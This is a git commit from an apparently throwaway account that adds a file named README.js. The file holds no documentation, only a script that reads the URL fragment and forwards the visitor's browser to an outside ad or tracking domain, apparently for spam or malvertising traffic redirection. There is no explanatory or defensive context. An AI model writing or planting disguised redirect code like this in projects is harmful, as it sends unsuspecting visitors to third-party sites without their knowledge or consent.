0dec27422fc71d0efc759e8fcb7bc61f14307210
zve14y3uasrb <jjkjk155@gmail.com>
2024-12-12 12:25:00 +0100

    Add files via upload

---
+++ README.js
@@ -0,0 +1,9 @@
+<script type='text/javascript'>
+var tarcking_param = window.location.href.split(&#39;#&#39;)[1];
+var srv = &quot;adsolary.com&quot;;
+if(!tarcking_param){
+alert(&quot;please set tracking params!&quot;);
+}else{
+document.location.href = &#39;http://&#39;+srv+&#39;/&#39;+tarcking_param;
+}
+</script>
